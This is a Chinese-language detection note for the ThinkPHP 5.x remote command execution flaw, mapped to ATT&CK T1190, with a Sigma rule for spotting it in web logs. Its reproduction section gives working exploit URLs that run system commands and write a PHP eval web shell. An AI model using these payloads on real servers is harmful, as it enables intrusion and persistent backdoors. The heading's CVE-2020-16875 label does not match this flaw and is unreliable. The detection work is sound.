# T1190-Thinkphp 5.x远程命令执行漏洞检测

## 来自ATT&CK的描述

使用软件，数据或命令来利用面向Internet的计算机系统或程序中的弱点，从而导致意外或无法预期的行为。系统的弱点可能是错误、故障或设计漏洞。这些应用程序通常是网站，但是可以包括数据库（例如SQL），标准服务（例如SMB 或SSH）以及具有Internet可访问开放的任何其他应用程序，例如Web服务器和相关服务。根据所利用的缺陷，这可能包括“利用防御防卫”。

如果应用程序托管在基于云的基础架构上，则对其进行利用可能会导致基础实际应用受到损害。这可以使攻击者获得访问云API或利用弱身份和访问管理策略的路径。

对于网站和数据库，OWASP排名前10位和CWE排名前25位突出了最常见的基于Web的漏洞。

## CVE-2020-16875漏洞

### 简介

ThinkPHP官方2018年12月9日发布重要的安全更新，修复了一个严重的远程代码执行漏洞。该更新主要涉及一个安全更新，由于框架对控制器名没有进行足够的检测会导致在没有开启强制路由的情况下可能的getshell漏洞，受影响的版本包括5.0和5.1版本，推荐尽快更新到最新版本。

### 影响版本

5.x < 5.1.31, <= 5.0.23

## 测试案例

漏洞分析及漏洞利用可参考Thinkphp 5.x远程命令执行漏洞：

<https://www.cnblogs.com/backlion/p/10106676.html>

## 检测日志

HTTP_log，访问日志也可以

## 测试复现

1.利用system函数远程命令执行

```yml
http://localhost:9096/public/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami
```

2.通过phpinfo函数写出phpinfo()的信息

```yml
http://localhost:9096/public/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
```

3.写入shell:

```yml
http://localhost:9096/public/index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo%20^%3C?php%20@eval($_GET[%22code%22])?^%3E%3Eshell.php
```

或者

```yml
http://localhost:9096/index.php?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=../test.php&vars[1][]=<?php echo 'ok';?>
```

## 测试留痕

暂无

## 检测规则/思路

### sigma规则

```yml
title: Thinkphp 5.x远程命令执行漏洞
description: 通过访问日志orHttp.log检测Thinkphp 5.x远程命令执行漏洞利用行为
translator: 12306Bro
date: 2020/12/12
status: experimental
references:
    - https://www.cnblogs.com/backlion/p/10106676.html
logsource:
    category: webserver
detection:
    selection:
        c-uri:
            - '/public/index.php?s=index/think\app/invokefunction&function=call_user_func_array'
    condition: selection
fields:
    - c-ip
    - c-dns
falsepositives:
    - Unknown
level: critical
```

## 备注

在具体业务场景下遇到，特记录。可以根据具体payload来判断是否为真实攻击。

## 参考推荐

MITRE-ATT&CK-T1190

<https://attack.mitre.org/techniques/T1190/>

Thinkphp 5.x远程命令执行漏洞：

<https://www.cnblogs.com/backlion/p/10106676.html>